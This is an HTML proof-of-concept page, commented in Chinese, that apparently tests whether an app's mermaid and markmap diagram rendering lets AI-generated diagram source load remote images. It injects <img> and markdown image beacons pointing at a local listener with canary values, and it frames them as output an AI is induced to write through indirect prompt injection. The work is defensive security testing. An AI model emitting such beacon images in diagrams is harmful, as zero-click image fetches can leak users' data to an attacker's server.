<!doctype html>
<html lang="zh">
  <head>
    <meta charset="utf-8" />
    <title>mermaid / markmap 信标 PoC (V2/V3)</title>
    <style>
      body { font-family: system-ui, sans-serif; padding: 24px; }
      h2 { font-weight: 600; }
      .note { color: #666; font-size: 13px; margin-bottom: 16px; }
      #stage { border: 1px solid #ddd; border-radius: 8px; padding: 12px; min-height: 200px; }
    </style>
  </head>
  <body>
    <h2 id="title">图表信标 PoC</h2>
    <p class="note" id="note"></p>
    <div id="stage"></div>

    <script type="module">
      // 用 ?engine= 选择要现场渲染的引擎与配置：
      //   mermaid-loose  —— 同一恶意 mermaid 源，securityLevel:"loose"（对照：演示「若降级」会怎样）
      //   mermaid-strict —— 同一恶意 mermaid 源，securityLevel:"strict"（= App Diagram.tsx 的真实配置）
      //   markmap        —— markmap，markdown 里含一张图片信标（= App Diagram.tsx 的真实代码路径，无 DOMPurify）
      const engine = new URL(location.href).searchParams.get("engine") || "markmap";
      const BEACON = "http://127.0.0.1:9099";
      const title = document.getElementById("title");
      const note = document.getElementById("note");
      const stage = document.getElementById("stage");
      window.__demoError = null;

      async function run() {
        if (engine.startsWith("mermaid")) {
          const strict = engine === "mermaid-strict";
          title.textContent = `mermaid（securityLevel: ${strict ? "strict（= App 真实配置）" : "loose（对照）"}）`;
          note.textContent =
            "下面这张「流程图」的节点标签里被塞了一个 <img>，src 指向本地信标。strict 下经 DOMPurify 应被清除/转义，loose 下会被当 HTML 渲染。";
          const mermaid = (await import("mermaid")).default;
          // 与 App Diagram.tsx MermaidDiagram 完全相同的初始化（仅 securityLevel 在 loose 对照里改动）。
          mermaid.initialize({
            startOnLoad: false,
            securityLevel: strict ? "strict" : "loose",
            theme: "default",
            fontFamily: "inherit",
          });
          // 模拟「被间接注入诱导 AI 写出」的 mermaid 源：节点标签内嵌远程 <img>（零点击取图 = 信标）。
          // 注意：mermaid flowchart 的引号标签里不能出现 `(`（会被当 PS token），故用纯 <img>（无 onerror、
          // 无 fetch()）。loose 下 htmlLabels=true 会把它当 HTML 渲染 → 浏览器取图；strict 下应被清除/转义。
          const code = [
            "flowchart TD",
            `  A["开始 <img src='${BEACON}/mermaid-node-img?s=CANARY-MM' /> 结束"]`,
          ].join("\n");
          const { svg } = await mermaid.render("poc-mmd", code);
          // 镜像 App 的 dangerouslySetInnerHTML：把渲染出的 SVG 原样塞进 DOM。
          stage.innerHTML = svg;
        } else {
          title.textContent = "markmap（= App 真实代码路径：Transformer().transform → Markmap.create）";
          note.textContent =
            "下面这张「思维导图」的某个节点是一张 markdown 图片，地址指向本地信标。markmap 把节点 HTML 渲染进 foreignObject，无 DOMPurify。";
          const [{ Transformer }, { Markmap }] = await Promise.all([
            import("markmap-lib"),
            import("markmap-view"),
          ]);
          // 模拟「被间接注入诱导 AI 写出」的 markmap 源：某节点是一张 markdown 图片（零点击取图 = 信标）。
          const code = [
            "# 季度规划",
            "## 目标",
            "### 增长",
            `### ![](${BEACON}/markmap-img?s=CANARY-MK)`,
          ].join("\n");
          const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
          svg.setAttribute("style", "width: 100%; height: 320px;");
          stage.appendChild(svg);
          const { root } = new Transformer().transform(code);
          Markmap.create(svg, undefined, root);
        }
      }

      try {
        await run();
      } catch (e) {
        window.__demoError = String(e);
      } finally {
        const done = document.createElement("div");
        done.id = "demo-done";
        document.body.appendChild(done);
      }
    </script>
  </body>
</html>
